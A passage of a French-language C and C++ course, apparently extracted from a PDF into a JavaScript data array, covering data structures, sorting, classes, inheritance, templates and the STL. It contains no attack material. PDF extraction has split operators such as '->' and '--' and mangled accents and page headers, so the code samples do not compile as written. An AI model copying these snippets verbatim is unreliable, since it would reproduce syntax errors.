     fseek(f, offset, origine) – les origines :
         SEEK_SET : depuis le début du fichier
         SEEK_CUR : depuis la position actuelle
         SEEK_END : depuis la fin du fichier
     Taille d'un fichier :
 1   fseek (f , 0 , SEEK_END ) ;
 2   long taille = ftell ( f ) ;
 3   rewind ( f ) ;

  Chapitre     8
Structures de Données en C`},{id:"8.1",c:8,t:"Listes chaînées",x:`❖ Définition – Liste chaînée
     Une liste chaînée est une structure de données linéaire où chaque élément (n÷ud) contient une
     donnée et un pointeur vers l'élément suivant.
     Types :
        Simplement chaînée : chaque n÷ud pointe vers le suivant
        Doublement chaînée : chaque n÷ud pointe vers le suivant ET le précédent
        Circulaire : le dernier n÷ud pointe vers le premier
                    Opération            Liste chaînée                       Tableau
                  Accès par indice       O(n)                                O(1)
     Complexité : Insertion en tête      O(1)                                O(n)
                  Insertion en queue     O(n) ou O(1)a                       O(1) amorti
                  Suppression en tête    O(1)                                O(n)
                  Recherche              O(n)                                O(n) (ou O(log n) si trié)

     ➤ Exemple – Opérations sur une liste simplement chaînée

 1   typedef struct Noeud {
 2       int data ;
 3       struct Noeud * next ;
 4   } Noeud ;
 6   /* Affichage */
 7   void afficher ( Noeud * tete ) {
 8       Noeud * courant = tete ;
 9       while ( courant != NULL ) {
10           printf ( " % d -> " , courant - > data ) ;
11           courant = courant - > next ;
12       }
13       printf ( " NULL \\ n " ) ;
14   }
16   /* Suppression en t ê te */
17   Noeud * supprimerTete ( Noeud * tete ) {
18       if ( tete == NULL ) return NULL ;
19       Noeud * nouveau = tete - > next ;

20         free ( tete ) ;
21         return nouveau ;
22   }
24   /* Recherche */
25   Noeud * rechercher ( Noeud * tete , int val ) {
26       while ( tete != NULL ) {
27            if ( tete - > data == val ) return tete ;
28            tete = tete - > next ;
29       }
30       return NULL ;
31   }
33   /* Lib'erer toute la liste */
34   void liberer ( Noeud * tete ) {
35       while ( tete != NULL ) {
36            Noeud * temp = tete ;
37            tete = tete - > next ;
38            free ( temp ) ;
39       }
40   }`},{id:"8.2",c:8,t:"Piles (Stack)",x:`❖ Définition – Pile
     Une pile est une structure de données de type LIFO (Last In, First Out – Dernier entré, premier
     sorti).
     Opérations : push (empiler), pop (dépiler), peek/top (consulter le sommet), isEmpty (est vide
     ?).
     Toutes les opérations sont en O(1).

     ➤ Exemple – Pile avec tableau

 1   # define   MAX 100
 2   typedef    struct {
 3        int   elements [ MAX ];
 4        int   sommet ;
 5   } Pile ;
 7   void init ( Pile * p ) { p - > sommet = -1; }
 8   int estVide ( Pile * p ) { return p - > sommet == -1; }
 9   int estPleine ( Pile * p ) { return p - > sommet == MAX - 1; }
10   void push ( Pile *p , int val ) {
11       if (! estPleine ( p ) ) p - > elements [++( p - > sommet ) ] = val ;
12   }
13   int pop ( Pile * p ) {
14       if (! estVide ( p ) ) return p - > elements [( p - > sommet ) - -];
15       return -1; /* Erreur */
16   }
17   int peek ( Pile * p ) {
18       if (! estVide ( p ) ) return p - > elements [p - > sommet ];
19       return -1;
20   }`},{id:"8.3",c:8,t:"Files (Queue)",x:`❖ Définition – File
     Une file est une structure de données de type FIFO (First In, First Out – Premier entré, premier
     sorti).
     Opérations : enqueue (enfiler), dequeue (défiler), front (premier élément), isEmpty.

     ➤ Exemple – File circulaire avec tableau

 1   # define   MAX 100
 2   typedef    struct {
 3        int   elements [ MAX ];
 4        int   debut , fin , taille ;
 5   } File ;
 7   void init ( File * f ) { f - > debut = 0; f - > fin = -1; f - > taille = 0; }
 8   int estVide ( File * f ) { return f - > taille == 0; }
 9   void enfiler ( File *f , int val ) {
10       if (f - > taille < MAX ) {
11           f - > fin = (f - > fin + 1) % MAX ;
12           f - > elements [f - > fin ] = val ;
13           f - > taille ++;
14       }
15   }
16   int defiler ( File * f ) {
17       if (! estVide ( f ) ) {
18           int val = f - > elements [f - > debut ];
19           f - > debut = (f - > debut + 1) % MAX ;
20           f - > taille - -;
21           return val ;
22       }
23       return -1;
24   }`},{id:"8.4",c:8,t:"Arbres binaires",x:`❖ Définition – Arbre binaire
     Un arbre binaire est une structure hiérarchique où chaque n÷ud a au plus deux enfants
     (gauche et droit).
     Vocabulaire :
        Racine : n÷ud sans parent
        Feuille : n÷ud sans enfant
        Hauteur : longueur du plus long chemin de la racine à une feuille
        ABR (Arbre Binaire de Recherche) : pour tout n÷ud, les valeurs du sous-arbre gauche
          < valeur du n÷ud < valeurs du sous-arbre droit
     Parcours :
        Préfixe (préordre) : Racine → Gauche → Droit
        Infixe (in-ordre) : Gauche → Racine → Droit (donne les valeurs triées pour un ABR)
        Postfixe (post-ordre) : Gauche → Droit → Racine
        En largeur (BFS) : niveau par niveau

     ➤ Exemple – Implémentation d'un ABR

 1   typedef struct Noeud {
 2       int data ;
 3       struct Noeud * gauche , * droit ;
 4   } Noeud ;
 6   Noeud * creer ( int val ) {
 7       Noeud * n = ( Noeud *) malloc ( sizeof ( Noeud ) ) ;
 8       n - > data = val ;
 9       n - > gauche = n - > droit = NULL ;
10       return n ;
11   }
13   Noeud * inserer ( Noeud * racine , int val ) {
14       if ( racine == NULL ) return creer ( val ) ;
15       if ( val < racine - > data )
16            racine - > gauche = inserer ( racine - > gauche , val ) ;
17       else if ( val > racine - > data )
18            racine - > droit = inserer ( racine - > droit , val ) ;
19       return racine ;
20   }
22   void infixe ( Noeud * r ) {
23       if ( r != NULL ) {
24            infixe (r - > gauche ) ;
25            printf ( " % d " , r - > data ) ;
26            infixe (r - > droit ) ;
27       }
28   }`},{id:"8.5",c:8,t:"Algorithmes de tri",x:`➔ Résumé rapide – Complexités des algorithmes de tri

      Algorithme               Meilleur                   Moyen                  Pire
      Tri à bulles             O(n)                       O(n2 )                 O(n2 )
      Tri par sélection        O(n2 )                     O(n2 )                 O(n2 )
      Tri par insertion        O(n)                       O(n2 )                 O(n2 )
      Tri rapide (Quicksort)   O(n log n)                 O(n log n)             O(n2 )
      Tri fusion (Mergesort)   O(n log n)                 O(n log n)             O(n log n)
     Stabilité : Un tri est stable s'il préserve l'ordre relatif des éléments égaux.
         Stables : Insertion, Fusion, à Bulles
         Non stables : Sélection, Rapide

     ➤ Exemple – Tri rapide (Quicksort)

 1   void echanger ( int *a , int * b ) {
 2       int t = * a ; * a = * b ; * b = t ;
 3   }
 5   int partition ( int tab [] , int gauche , int droite ) {
 6       int pivot = tab [ droite ];

 7       int i = gauche - 1;
 8       for ( int j = gauche ; j < droite ; j ++) {
 9           if ( tab [ j ] <= pivot ) {
10                i ++;
11                echanger (& tab [ i ] , & tab [ j ]) ;
12           }
13       }
14       echanger (& tab [ i + 1] , & tab [ droite ]) ;
15       return i + 1;
16   }
18   void quicksort ( int tab [] , int gauche , int droite ) {
19       if ( gauche < droite ) {
20            int pi = partition ( tab , gauche , droite ) ;
21            quicksort ( tab , gauche , pi - 1) ;
22            quicksort ( tab , pi + 1 , droite ) ;
23       }
24   }

  Chapitre     9
Introduction au C++`},{id:"9.1",c:9,t:"C++ vs C",x:`❖ Définition – Le langage C++
 Le C++ est un langage de programmation multi-paradigme créé par Bjarne Stroustrup en
 1979 (initialement «C with Classes»). Il étend le C en ajoutant :
     La Programmation Orientée Objet (classes, héritage, polymorphisme)
     La programmation générique (templates)
     La surcharge d'opérateurs et de fonctions
     Les références
     Les exceptions
     La STL (Standard Template Library)
     Les espaces de noms (namespaces)
 Standards : C++98, C++03, C++11, C++14, C++17, C++20, C++23.

 ✿ Règle – Différences majeures C vs C++

  Caractéristique      C                              C++
  Paradigme            Procédural                     Multi-paradigme (OOP, générique,
                                                      procédural)
  E/S standard         printf/scanf                   cout/cin (+ printf/scanf)
  Allocation mémoire   malloc/free                    new/delete (+ malloc/free)
  Booléen              _Bool (C99)                    bool (natif)
  Commentaires         /* */                          /* */ et //
  Structures           Pas de méthodes                Classes (méthodes, accès)
  Surcharge            Non                            Oui (fonctions et opérateurs)
  Références           Non                            Oui (&)
  Templates            Non                            Oui
  Exceptions           Non                            Oui (try/catch/throw)`},{id:"9.2",c:9,t:"Entrées/Sorties en C++",x:`➣ Syntaxe

 1   # include < iostream >
 2   using namespace std ;
 4   int main () {
 5       int age ;
 6       string nom ;
 8        cout << " Nom : " ;            /* cout = sortie standard */
 9        cin >> nom ;                    /* cin = entr'ee standard */
10        cout << " Age : " ;
11        cin >> age ;
13        cout << " Bonjour " << nom << " , vous avez " << age << " ans . " <<
             endl ;
15        /* endl = '\\ n ' + flush du buffer */
16        /* '\\ n ' est pr'ef'er'e pour la performance */
18        cerr << " Message d ' erreur " << endl ;          /* Sortie d ' erreur */
20         return 0;
21   }

     ☞ Attention / Piège
          cin  s'arrête au premier espace. Utiliser getline(cin, str) pour lire une ligne complète.
          Après un cin , il reste un '\\n' dans le buffer. Avant getline(), utiliser cin.ignore().
          endl fait un flush du buffer (plus lent que '\\n').`},{id:"9.3",c:9,t:"Références en C++",x:`❖ Définition – Référence
     Une référence est un alias (autre nom) pour une variable existante. Déclarée avec &. Elle doit
     être initialisée à la déclaration et ne peut pas être réassignée.

     ➣ Syntaxe

 1   int x = 10;
 2   int & ref = x ;       /* ref est un alias de x */
 3   ref = 20;             /* x vaut maintenant 20 */
 5   /* Passage par r'ef'erence ( modifie l ' original ) */
 6   void echanger ( int &a , int & b ) {
 7       int temp = a ;
 8       a = b;
 9       b = temp ;
10   }
12   /* Passage par r'ef'erence constante ( lecture seule , 'evite la copie ) */

13   void afficher ( const string & s ) {
14       cout << s << endl ;
15       /* s ne peut pas ê tre modifi'e */
16   }

     ✿ Règle – Référence vs Pointeur

                       Référence (&)                          Pointeur (*)
      Initialisation   Obligatoire à la déclaration           Peut être NULL
      Réassignation    Impossible                             Possible
      Syntaxe          Directe (ref = 5)                      Indirection (*p = 5)
      Adresse propre   Non (même adresse que l'original)      Oui
      Tableau          Non                                    Oui
      Arithmétique     Non                                    Oui`},{id:"9.4",c:9,t:"Allocation dynamique en C++",x:`➣ Syntaxe

 1   /* Allocation simple */
 2   int * p = new int ;             /* Alloue un int */
 3   int * p = new int (42) ;        /* Alloue et initialise à 42 */
 4   delete p ;                      /* Lib è re */
 6   /* Allocation tableau */
 7   int * tab = new int [10];           /* Alloue 10 int */
 8   int * tab = new int [10]() ;        /* Alloue 10 int initialis'es à 0 */
 9   delete [] tab ;                     /* Lib è re le tableau */

     ✿ Règle – new/delete vs malloc/free
         new appelle le constructeur, malloc non
         delete appelle le destructeur, free non
         new retourne un pointeur typé, malloc retourne void*
         new lève une exception std::bad_alloc en cas d'échec, malloc retourne NULL
         Ne jamais mélanger : new avec free ou malloc avec delete
         delete[] pour les tableaux alloués avec new[], sinon comportement indéfini`},{id:"9.5",c:9,t:"Surcharge de fonctions",x:`❖ Définition – Surcharge (Overloading)
     La surcharge permet de définir plusieurs fonctions avec le même nom mais des paramètres
     différents (nombre, types ou ordre). Le compilateur choisit la bonne version selon les arguments
     passés.

     ➣ Syntaxe

 1   int addition ( int a , int b ) { return a + b ; }
 2   double addition ( double a , double b ) { return a + b ; }
 3   int addition ( int a , int b , int c ) { return a + b + c ; }
 5   /* Le type de retour SEUL ne suffit pas pour diff'erencier */
 6   /* int f ( int x ) ; et double f ( int x ) ; = > ERREUR ! */`},{id:"9.6",c:9,t:"Paramètres par défaut",x:`➣ Syntaxe

 1   /* Les param è tres par d'efaut doivent ê tre à la FIN */
 2   void afficher ( string nom , int age = 18 , string ville = " Rabat " ) {
 3       cout << nom << " , " << age << " ans , " << ville << endl ;
 4   }
 6   afficher ( " Ali " ) ;                    /* Ali , 18 ans , Rabat */
 7   afficher ( " Sara " , 22) ;               /* Sara , 22 ans , Rabat */
 8   afficher ( " Karim " , 25 , " F è s " ) ; /* Karim , 25 ans , F è s */`},{id:"9.7",c:9,t:"Espaces de noms (Namespaces)",x:`❖ Définition – Namespace
     Un espace de noms est un mécanisme qui permet de regrouper des identifiants (classes, fonctions,
     variables) sous un nom pour éviter les conflits de noms.

     ➣ Syntaxe

 1   namespace Maths {
 2       int addition ( int a , int b ) { return a + b ; }
 3       const double PI = 3.14159;
 4   }
 6   /* Utilisation */
 7   int r = Maths :: addition (3 , 4) ;
 8   double p = Maths :: PI ;
10   /* Directive using ( à 'eviter dans les headers ) */
11   using namespace std ;
12   using std :: cout ; /* Importe seulement cout */

  Chapitre   10
Programmation Orientée Objet en C++`},{id:"10.1",c:10,t:"Classes et Objets",x:`❖ Définition – Classe et Objet
         Une classe est un modèle (plan) qui définit des attributs (données) et des méthodes
          (fonctions) pour un type d'objets.
         Un objet est une instance d'une classe – une variable concrète créée à partir du modèle.
     Les 4 piliers de la POO :
       1. Encapsulation : cacher les détails internes, exposer une interface
       2. Abstraction : représenter les concepts essentiels sans les détails
       3. Héritage : créer de nouvelles classes à partir de classes existantes
       4. Polymorphisme : une même interface, plusieurs comportements

     ➣ Syntaxe – Déclaration d'une classe

 1   class Personne {
 2   private :                            /* Accessible uniquement dans la classe */
 3       string nom ;
 4       int age ;
 6   protected :                          /* Accessible dans la classe et ses sous -
        classes */
 7       string adresse ;
 9   public :                        /* Accessible partout */
10       /* Constructeur */
11       Personne ( string n , int a ) : nom ( n ) , age ( a ) {}
13        /* Constructeur par d'efaut */
14        Personne () : nom ( " " ) , age (0) {}
16        /* Destructeur */
17        ~ Personne () { cout << " Destruction de " << nom << endl ; }
19        /* M'ethodes */
20        string getNom ()     const { return nom ; }
21        void setAge ( int    a ) { if ( a >= 0) age = a ; }
22        void afficher ()     const {
23             cout << nom     << " , " << age << " ans " << endl ;
24        }

                                    OBJETCONSTRUCTEURS
                                           EN C++      ET DESTRUCTEUR
25   };
27   /* Utilisation */
28   Personne p1 ( " Ali " , 22) ;
29   Personne p2 ;
30   p1 . afficher () ;

     ✿ Règle – Modificateurs d'accès

      Accès            private                   protected                public
      Même classe      ✔                         ✔                        ✔
      Classe dérivée   ✘                         ✔                        ✔
      Extérieur        ✘                         ✘                        ✔
     Par défaut : les membres d'une class sont private, ceux d'un struct sont public.`},{id:"10.2",c:10,t:"Constructeurs et Destructeur",x:`❖ Définition – Types de constructeurs
           Constructeur par défaut : sans paramètres (ou tous avec valeurs par défaut)
           Constructeur paramétré : avec des paramètres
           Constructeur de copie : crée un objet à partir d'un autre objet du même type
           Destructeur : appelé automatiquement à la destruction de l'objet, préfixé par ~

     ➣ Syntaxe

 1   class Tableau {
 2   private :
 3       int * data ;
 4       int taille ;
 5   public :
 6       /* Constructeur param'etr'e */
 7       Tableau ( int t ) : taille ( t ) {
 8             data = new int [ taille ]() ;         /* Alloue et initialise à 0 */
 9       }
11         /* Constructeur de copie ( copie profonde ) */
12         Tableau ( const Tableau & autre ) : taille ( autre . taille ) {
13             data = new int [ taille ];
14             for ( int i = 0; i < taille ; i ++)
15                   data [ i ] = autre . data [ i ];
16         }
18         /* Op'erateur d ' affectation */
19         Tableau & operator =( const Tableau & autre ) {
20             if ( this != & autre ) {                  /* Auto - affectation ? */
21                  delete [] data ;                     /* Lib'erer l ' ancien */
22                  taille = autre . taille ;
23                  data = new int [ taille ];           /* Allouer nouveau */
24                  for ( int i = 0; i < taille ; i ++)
25                      data [ i ] = autre . data [ i ];
26             }

27               return * this ;
28          }
30          /* Destructeur */
31          ~ Tableau () {
32               delete [] data ;
33          }
34   };

     ✿ Règle – Règle des Trois (Rule of Three)
     Si une classe définit l'un des trois suivants, elle devrait définir les trois :
          1. Destructeur
          2. Constructeur de copie
          3. Opérateur d'affectation (operator=)
     C'est nécessaire dès qu'une classe gère des ressources dynamiques (mémoire, fichiers, etc.).
     En C++11+ : Rule of Five (ajouter le constructeur de déplacement et l'opérateur d'affectation
     de déplacement).`},{id:"10.3",c:10,t:"Mot-clé this",x:`❖ Définition
     this est un pointeur implicite vers l'objet courant. Il est disponible dans toutes les méthodes
     non statiques.
           Type : Classe *const (on ne peut pas changer this)
           Utilisé pour lever l'ambiguïté entre attribut et paramètre
           Utilisé pour retourner l'objet courant (return *this;)`},{id:"10.4",c:10,t:"Membres statiques",x:`❖ Définition – static dans une classe
           Un attribut statique appartient à la classe (pas à un objet). Il est partagé par toutes les
            instances.
           Une méthode statique n'a pas accès à this et ne peut accéder qu'aux membres statiques.

     ➣ Syntaxe

 1   class Compteur {
 2   private :
 3       static int count ; /* D'eclaration */
 4   public :
 5       Compteur () { count ++; }
 6       ~ Compteur () { count - -; }
 7       static int getCount () { return count ; }
 8   };
 9   int Compteur :: count = 0; /* Initialisation OBLIGATOIRE hors de la
        classe */

                                10.5. OBJET
                                       FONCTIONS
                                            EN C++ET CLASSES AMIES (FRIEND)`},{id:"10.5",c:10,t:"Fonctions et classes amies (friend)",x:`❖ Définition – Friend
     Le mot-clé friend permet à une fonction ou une classe extérieure d'accéder aux membres privés
     et protégés d'une classe. L'amitié n'est pas transitive, pas héritée, et pas symétrique.

     ➣ Syntaxe

 1   class MaClasse {
 2       int secret ;
 3   public :
 4       MaClasse ( int s ) : secret ( s ) {}
 5       friend void afficherSecret ( const MaClasse & obj ) ;           /* Fonction amie
              */
 6       friend class AutreClasse ; /* Classe amie */
 7   };
 9   void afficherSecret ( const MaClasse & obj ) {
10       cout << obj . secret << endl ; /* Acc è s au membre priv'e */
11   }

 Chapitre      11
Héritage et Polymorphisme`},{id:"11.1",c:11,t:"Héritage",x:`❖ Définition – Héritage
     L'héritage permet de créer une classe dérivée (fille) qui hérite des attributs et méthodes d'une
     classe de base (mère). Cela représente la relation «est-un» (is-a).

     ➣ Syntaxe

 1   class Animal {             /* Classe de base */
 2   protected :
 3       string nom ;
 4   public :
 5       Animal ( string n ) : nom ( n ) {}
 6       void manger () { cout << nom << " mange . " << endl ; }
 7       virtual void crier () { cout << " ... " << endl ; }
 8       virtual ~ Animal () {} /* Destructeur virtuel ! */
 9   };
11   class Chien : public Animal { /* H'eritage public */
12       string race ;
13   public :
14       Chien ( string n , string r ) : Animal ( n ) , race ( r ) {}
15       void crier () override { cout << nom << " aboie ! " << endl ; }
16       void chercher () { cout << nom << " cherche la balle . " << endl ; }
17   };

     ✿ Règle – Types d'héritage

      Membre de la base Héritage public                  Héritage protected Héritage private
      public                  public                     protected             private
      protected               protected                  protected             private
      private                 inaccessible               inaccessible          inaccessible
     Le plus utilisé : l'héritage public. Les autres sont rares en pratique.

     ✿ Règle – Règles de l'héritage
        Le constructeur de la classe de base est appelé avant celui de la dérivée
        Le destructeur de la dérivée est appelé avant celui de la base
        Les constructeurs et le destructeur ne sont pas hérités
        L'opérateur d'affectation n'est pas hérité
        Un objet dérivé peut être traité comme un objet de la classe de base (upcasting)
        Si la classe de base a un destructeur virtuel, le destructeur de la dérivée sera correctement
         appelé via un pointeur de base`},{id:"11.2",c:11,t:"Polymorphisme",x:`❖ Définition – Types de polymorphisme
        Polymorphisme statique (à la compilation) :
           — Surcharge de fonctions (overloading)
           — Surcharge d'opérateurs
           — Templates
        Polymorphisme dynamique (à l'exécution) :
           — Fonctions virtuelles (virtual)
           — Redéfinition (override)
           — Liaison tardive (late binding) via le vtable

     ✿ Règle – Fonctions virtuelles
        Déclarées avec virtual dans la classe de base
        La redéfinition dans la classe dérivée utilise override (C++11)
        Le polymorphisme fonctionne uniquement via des pointeurs ou des références
        Sans virtual, c'est la liaison statique (type déclaré) qui détermine la méthode appelée
        Avec virtual, c'est la liaison dynamique (type réel) qui détermine
        Toujours déclarer le destructeur virtual si la classe a des méthodes virtuelles

     ➤ Exemple – Polymorphisme dynamique

 1   class Forme {
 2   public :
 3       virtual double aire () const = 0;              /* M'ethode pure virtuelle */
 4       virtual ~ Forme () {}
 5   };
 7   class Cercle : public Forme {
 8       double rayon ;
 9   public :
10       Cercle ( double r ) : rayon ( r ) {}
11       double aire () const override { return 3.14159 * rayon * rayon ; }
12   };
14   class Rectangle : public Forme {
15       double largeur , hauteur ;
16   public :
17       Rectangle ( double l , double h ) : largeur ( l ) , hauteur ( h ) {}
18       double aire () const override { return largeur * hauteur ; }
19   };

21   /* Utilisation polymorphique */
22   void afficherAire ( const Forme & f ) {
23       cout << " Aire = " << f . aire () << endl ;
24   }
26   int main () {
27       Cercle c (5) ;
28       Rectangle r (3 , 4) ;
29       afficherAire ( c ) ; /* Aire = 78.5398 */
30       afficherAire ( r ) ; /* Aire = 12 */
32        /* Tableau polymorphique */
33        Forme * formes [2] = { new Cercle (5) , new Rectangle (3 ,4) };
34        for ( int i = 0; i < 2; i ++) {
35            cout << formes [ i ] - > aire () << endl ;
36            delete formes [ i ];
37        }
38        return 0;
39   }`},{id:"11.3",c:11,t:"Classes abstraites",x:`❖ Définition – Classe abstraite
     Une classe abstraite contient au moins une méthode pure virtuelle (déclarée avec = 0). Elle
     ne peut pas être instanciée. Les classes dérivées doivent implémenter toutes les méthodes
     pures virtuelles pour être concrètes.

     ✿ Règle
          Syntaxe : virtual type methode() = 0;
          Sert d'interface (contrat) pour les classes dérivées
          Peut avoir des membres données, des constructeurs et des méthodes non-virtuelles
          Si une dérivée n'implémente pas toutes les méthodes pures, elle reste abstraite
          C++ n'a pas de mot-clé interface comme Java. On utilise des classes abstraites pures
           (toutes les méthodes sont virtuelles pures).`},{id:"11.4",c:11,t:"Héritage multiple",x:`❖ Définition
     Le C++ supporte l'héritage multiple : une classe peut hériter de plusieurs classes de base.

     ➣ Syntaxe

 1   class A { public : void methodeA () {} };
 2   class B { public : void methodeB () {} };
 3   class C : public A , public B { /* H'eritage multiple */
 4       /* C h'erite de A et B */
 5   };

     ☞ Attention / Piège – Problème du diamant

 1   class A { public : int x ; };
 2   class B : public A {};
 3   class C : public A {};
 4   class D : public B , public C {};
 5   /* D a DEUX copies de x : B :: x et C :: x = > ambigu ï t'e */
 7   /* Solution : h'eritage virtuel */
 8   class B : virtual public A {};
 9   class C : virtual public A {};
10   class D : public B , public C {};
11   /* D n 'a qu ' UNE seule copie de x */`},{id:"11.5",c:11,t:"Surcharge d'opérateurs",x:`❖ Définition – Opérateurs surchargeables
     La plupart des opérateurs peuvent être surchargés sauf : ::, ., .*, ?:, sizeof, typeid.

     ➤ Exemple – Surcharge complète

 1   class Vecteur {
 2       double x , y ;
 3   public :
 4       Vecteur ( double x = 0 , double y = 0) : x ( x ) , y ( y ) {}
 6        /* Surcharge + ( m'ethode membre ) */
 7        Vecteur operator +( const Vecteur & v ) const {
 8            return Vecteur ( x + v .x , y + v . y ) ;
 9        }
11        /* Surcharge == */
12        bool operator ==( const Vecteur & v ) const {
13            return x == v . x && y == v . y ;
14        }
16        /* Surcharge [] */
17        double & operator []( int i ) {
18            return ( i == 0) ? x : y ;
19        }
21        /* Surcharge << ( fonction amie ) */
22        friend ostream & operator < <( ostream & os , const Vecteur & v ) {
23            os << " ( " << v . x << " , " << v . y << " ) " ;
24            return os ;
25        }
27        /* Surcharge >> */
28        friend istream & operator > >( istream & is , Vecteur & v ) {
29            is >> v . x >> v . y ;
30            return is ;
31        }
32   };

  Chapitre    12
Templates (Généricité)
     ❖ Définition – Template
     Les templates permettent d'écrire du code générique qui fonctionne avec n'importe quel type.
     C'est le mécanisme de programmation générique en C++. Ils sont résolus à la compilation
     (pas à l'exécution).

     ➣ Syntaxe – Template de fonction

 1   template < typename T >
 2   T maximum ( T a , T b ) {
 3       return ( a > b ) ? a : b ;
 4   }
 6   /* Utilisation */
 7   cout << maximum (3 , 7) ;                /* T = int ( d'eduit ) */
 8   cout << maximum (3.14 , 2.71) ;          /* T = double ( d'eduit ) */
 9   cout << maximum < string >( " abc " , " xyz " ) ; /* T = string ( explicite ) */
11   /* Template avec plusieurs types */
12   template < typename T , typename U >
13   auto additionner ( T a , U b ) -> decltype ( a + b ) {
14       return a + b ;
15   }

     ➣ Syntaxe – Template de classe

 1   template < typename T >
 2   class Pile {
 3       T * elements ;
 4       int taille , sommet ;
 5   public :
 6       Pile ( int t = 100) : taille ( t ) , sommet ( -1) {
 7            elements = new T [ taille ];
 8       }
 9       ~ Pile () { delete [] elements ; }
11        void push ( const T & val ) {
12            if ( sommet < taille - 1)
13                 elements [++ sommet ] = val ;
14        }

16         T pop () {
17             if ( sommet >= 0) return elements [ sommet - -];
18             throw runtime_error ( " Pile vide " ) ;
19         }
21         bool estVide () const { return sommet == -1; }
22   };
24   /* Utilisation */
25   Pile < int > pileInt ;
26   Pile < string > pileStr ;
27   pileInt . push (42) ;
28   pileStr . push ( " Bonjour " ) ;

     ✿ Règle – Règles des templates
           Les templates sont générés à la compilation (pas de coût à l'exécution)
           La définition doit être dans le même fichier (généralement le header)
           Chaque instanciation avec un type différent génère une nouvelle version du code
           Les templates supportent la spécialisation (version spécifique pour un type)

  Chapitre   13
La STL (Standard Template Library)
     ❖ Définition – STL
     La STL est une bibliothèque standard du C++ qui fournit des conteneurs (structures de don-
     nées), des algorithmes et des itérateurs génériques.`},{id:"13.1",c:13,t:"Conteneurs séquentiels",x:`✿ Règle – std::vector

 1   # include < vector >
 2   vector < int > v ;                       /* Vecteur vide */
 3   vector < int > v (5 , 0) ;              /* 5 'el'ements initialis'es à 0 */
 4   vector < int > v = {1 , 2 , 3 , 4 , 5}; /* Initialisation C ++11 */
 6   v . push_back (6) ;              /* Ajouter à la fin : O (1) amorti */
 7   v . pop_back () ;                /* Supprimer le dernier : O (1) */
 8   v . size () ;                    /* Nombre d ''el'ements */
 9   v . empty () ;                   /* Est vide ? */
10   v . capacity () ;                /* Capacit'e allou'ee */
11   v [0]; v . at (0) ;              /* Acc è s : O (1) . at () v'erifie les bornes */
12   v . front () ; v . back () ;     /* Premier / dernier 'el'ement */
13   v . clear () ;                   /* Supprimer tous les 'el'ements */
14   v . insert ( v . begin () +2 ,   99) ; /* Ins'erer à la position 2 : O ( n ) */
15   v . erase ( v . begin () +1) ;          /* Supprimer à la position 1 : O ( n ) */

     ✿ Règle – Autres conteneurs séquentiels

      Conteneur             Description                                                   Accès
      vector<T>             Tableau dynamique                                             O(1)
      deque<T>              Double-ended queue                                            O(1)
      list<T>               Liste doublement chaînée                                      O(n)
      forward_list<T>       Liste simplement chaînée                                      O(n)
      array<T, N>           Tableau statique (C++11)                                      O(1)

                                            13.2. CONTENEURS ASSOCIATIFS`},{id:"13.2",c:13,t:"Conteneurs associatifs",x:`✿ Règle

      Conteneur             Description                                              Recherche
      map<K,V>              Clé-valeur triée (arbre rouge-noir)                      O(log n)
      set<T>                Ensemble trié (pas de doublons)                          O(log n)
      multimap<K,V>         Clés dupliquées autorisées                               O(log n)
      multiset<T>           Doublons autorisés                                       O(log n)
      unordered_map<K,V>    Table de hachage                                         O(1) moy.
      unordered_set<T>      Ensemble non trié (hachage)                              O(1) moy.

     ➤ Exemple – map et set

 1   # include <map >
 2   # include <set >
 4   /* Map */
 5   map < string , int > ages ;
 6   ages [ " Ali " ] = 22;
 7   ages [ " Sara " ] = 21;
 8   ages . insert ({ " Karim " , 23}) ;
 9   if ( ages . count ( " Ali " ) )  cout << ages [ " Ali " ];
10   if ( ages . find ( " Sara " ) != ages . end () ) cout << " Trouv'e" ;
12   for ( auto &[ nom , age ] : ages ) /* C ++17 structured bindings */
13       cout << nom << " : " << age << endl ;
15   /* Set */
16   set < int > s = {5 , 3 , 1 , 4 , 2};
17   s . insert (6) ;
18   s . erase (3) ;
19   /* It'eration donne : 1 2 4 5 6 ( tri'e automatiquement ) */`},{id:"13.3",c:13,t:"Adaptateurs de conteneurs",x:`✿ Règle

      Adaptateur           Structure                              Opérations
      stack<T>             Pile (LIFO)                            push, pop, top, empty, size
      queue<T>             File (FIFO)                            push, pop, front, back,
                                                                  empty, size
      priority_queue<T>    File de priorité (max-heap)            push, pop, top, empty, size

                                  13.4. ALGORITHMES
                                        LIBRARY) DE LA STL (<ALGORITHM>)`},{id:"13.4",c:13,t:"Algorithmes de la STL (<algorithm>)",x:`✿ Règle

 1   # include < algorithm >
 2   vector < int > v = {5 , 3 , 1 , 4 , 2};
 4   sort ( v . begin () , v . end () ) ;                 /* Tri croissant */
 5   sort ( v . begin () , v . end () , greater < int >() ) ; /* Tri d'ecroissant */
 6   reverse ( v . begin () , v . end () ) ;              /* Inverser */
 7   auto it = find ( v . begin () , v . end () , 3) ; /* Recherche */
 8   int n = count ( v . begin () , v . end () , 3) ; /* Compter occurrences */
 9   int mx = * max_element ( v . begin () , v . end () ) ; /* Maximum */
10   int mn = * min_element ( v . begin () , v . end () ) ; /* Minimum */
11   bool present = binary_search ( v . begin () , v . end () , 3) ; /* Recherche
        binaire */
12   /* Le vecteur doit ê tre tri'e pour binary_search */
14   /* Avec lambda */
15   sort ( v . begin () , v . end () , []( int a , int b ) { return a > b ; }) ;
16   auto it2 = find_if ( v . begin () , v . end () , []( int x ) { return x > 3; }) ;`},{id:"13.5",c:13,t:"Chaînes en C++ (std::string)",x:`✿ Règle – Opérations sur string

 1   # include < string >
 3   string s = " Hello " ;
 4   s . length () ; s . size () ;       /* Taille */
 5   s . empty () ;                      /* Est vide ? */
 6   s += " World " ;                    /* Concat'enation */
 7   s . substr (0 , 5) ;                /* Sous - cha î ne : " Hello " */
 8   s . find ( " World " ) ;            /* Position : 6 ( ou string :: npos si absent )
          */
 9   s . replace (0 , 5 , " Bonjour " ) ; /* Remplacer */
10   s . insert (5 , " !!! " ) ;         /* Ins'erer */
11   s . erase (5 , 3) ;                 /* Supprimer 3 caract è res à la position 5 */
12   s . c_str () ;                      /* Conversion en char * (C - string ) */
13   s . compare ( " autre " ) ;         /* Comparaison ( comme strcmp ) */
14   s [0] = 'h ';                      /* Acc è s par indice */
15   stoi ( " 42 " ) ;                   /* String vers int */
16   stod ( " 3.14 " ) ;                 /* String vers double */
17   to_string (42) ;                    /* Int vers string */
19   /* Lecture */
20   getline ( cin , s ) ;            /* Lire une ligne compl è te */

 Chapitre     14
Gestion des Exceptions
     ❖ Définition – Exception
     Une exception est un événement anormal qui interrompt le flux normal du programme. Le C++
